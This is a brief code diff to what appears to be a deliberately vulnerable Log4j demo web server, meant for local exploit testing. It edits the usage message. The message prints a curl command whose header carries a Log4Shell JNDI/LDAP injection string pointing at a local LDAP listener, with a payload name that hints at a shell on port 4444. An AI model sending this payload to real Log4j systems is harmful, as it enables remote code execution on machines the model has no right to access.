@@ -21,8 +21,8 @@ public class Log4jWebServer {
     System.out.println("it will take a single paramter as a port");
     System.out.println("");
     System.out.println("You can call it using curl. Depending on your terminal you ");
-    System.out.println("may need to escape the $ :");
-    System.out.println("curl -H 'log_me: ${jndi:ldap://127.0.0.1:1389/#MiniMet}' http://127.0.0.1:8888/");
+    System.out.println("may need to escape the string :");
+    System.out.println("curl -H 'log_me: ${jndi:ldap://127.0.0.1:1389/#MM_127_0_0_1_4444}' http://127.0.0.1:8888/");
 
     int port = 8888;
     if(args.length > 0){
